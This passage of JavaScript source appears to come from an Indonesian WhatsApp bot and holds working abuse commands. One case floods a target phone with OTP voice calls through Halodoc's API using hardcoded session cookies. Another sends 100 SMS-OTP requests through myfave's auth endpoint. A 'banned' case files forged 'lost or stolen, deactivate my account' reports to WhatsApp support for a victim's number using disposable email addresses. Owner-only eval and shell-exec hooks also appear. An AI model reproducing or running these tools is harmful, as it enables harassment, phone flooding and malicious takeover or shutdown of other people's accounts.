axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${shinchan}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}})
.then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Succes Spam (CALL) BY SHINCHAN SENPAI INC`);
})
.catch(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Failed Spam (CALL) BY SHINCHAN SENPAI INC`);
});
}
reply(`[ 𝙎𝙪𝙠𝙨𝙚𝙨 𝙎𝙚𝙣𝙙 𝘾𝙖𝙡𝙡 ]\n\n﹗𝐂𝐚𝐥𝐥 : ${shinchan}\n﹗𝐀𝐦𝐨𝐮𝐧𝐭 : ${shinko}\n﹗𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}\n﹗𝐓𝐚𝐧𝐠𝐠𝐚𝐥 : ${week} ${weton}, ${date}\n﹗𝐉𝐚𝐦 : ${time}\n﹗𝐎𝐰𝐧𝐞𝐫 : ẉa.me/6282134110253`)
break
//=================================================
case 'sms': {
if (!isCreator) return m.reply('*khusus Owner*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) SHINCHAN SENPAI`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break
case 'banned': {
if (!isCreator) return m.reply('*khusus Owner*')
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hilang/Dicuri: Harap nonaktifkan akun saya ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
paycall(`DONE`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================//

default:
if (budy.startsWith('<')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}

if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}

if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(`*khusus Owner*`)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }

if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
conn.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
